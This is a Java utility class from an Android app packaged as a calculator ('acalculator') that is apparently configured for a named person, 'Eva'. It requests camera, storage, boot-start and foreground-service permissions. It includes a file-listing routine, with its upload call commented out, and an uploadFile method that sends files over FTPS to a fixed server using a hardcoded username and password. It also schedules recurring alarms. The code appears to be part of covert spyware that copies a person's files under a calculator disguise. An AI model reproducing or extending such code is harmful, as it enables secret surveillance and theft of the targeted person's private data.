package es.fraggel.acalculator;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPSClient;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;


public class Util {
    //App para eva
    //public static String EMAIL="fraggelillo666@gmail,com";
    //public static String NOMBRE="Pablo";
    //App para mi
    public static String EMAIL="eva@gmail,com";
    public static String NOMBRE="Eva";
    //App pruebas
    //public static String EMAIL="pruebas@gmail,com";
    //public static String NOMBRE="Nombre";

    public static String[] permissions = new String[]{
            Manifest.permission.SCHEDULE_EXACT_ALARM,
            Manifest.permission.INTERNET,
            Manifest.permission.VIBRATE,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.FOREGROUND_SERVICE};


    public static void GetFiles(String ruta){
        File f=new File(ruta);

        for (File file : f.listFiles()) {
            if(file.isDirectory()){
                //GetFiles(file.getAbsolutePath());
            }else{
                //uploadFile(file);
                Log.d("Calculator",file.getAbsolutePath());
            }
        }
    }
    public static void uploadFile(File file) {
        int flag;
        FileInputStream fis = null;
        FTPSClient client = new FTPSClient();
        try {
            fis = new FileInputStream(file);
            client.connect("192.168.0.42", 2121); // no el puerto es por defecto, podemos usar client.connect("servidor.ftp.com");
            client.execPBSZ(0);
            client.execPROT("P");
            client.login("fraggel", "ak47cold");
            client.enterLocalPassiveMode();
            client.enterLocalPassiveMode(); // IMPORTANTE!!!!
            client.setFileType(FTP.BINARY_FILE_TYPE);
            client.changeWorkingDirectory("/ftp");
            boolean uploadFile = client.storeFile(file.getName(), fis);
            client.logout();
            client.disconnect();

            if (uploadFile == false) {
                throw new Exception("Error al subir el fichero");
            }
        } catch (Exception eFTPClient) {
            eFTPClient.printStackTrace();
            // Gestionar el error, mostrar pantalla, reescalar excepcion... etc...
        } finally {
            try {
                fis.close();
            } catch (Exception e) {

            }

        }
    }
    static void setAlarm(Context context) {
        /*
        Intent intent = new Intent(context, AppService.class);
        PendingIntent pendingIntent = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            pendingIntent = PendingIntent.getForegroundService(context, 1, intent, 0);
        }
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 30000, pendingIntent);
        */
        AlarmReceiver alarm = new AlarmReceiver();
        alarm.setAlarm(context);
        /*AlarmManager aMgr = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, AppService.class);
        PendingIntent pendingIntent = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            pendingIntent = PendingIntent.getService(context, 1, intent, 0);
        }
        //aMgr.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + (1000 * 60 * 5), pendingIntent);
        aMgr.cancel(pendingIntent);
        aMgr.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + (1000), pendingIntent);*/
    }
    static void escribirLog(String TAG,String texto,Context context) {
        try{
            Log.d(TAG,texto);
            SimpleDateFormat dateFormat = new SimpleDateFormat("dd MM yy hh:mm a");
            Date currentDate = new Date();
            String cuurentDateString = dateFormat.format(currentDate);
            FileOutputStream fos=new FileOutputStream(ContextCompat.getExternalFilesDirs(context, null)[0]+"logCalculadora.txt",true);
            fos.write((cuurentDateString+" "+texto+"\n").getBytes());
            fos.flush();
            fos.close();
        }catch(Exception e){
            e.printStackTrace();

        }
    }
}
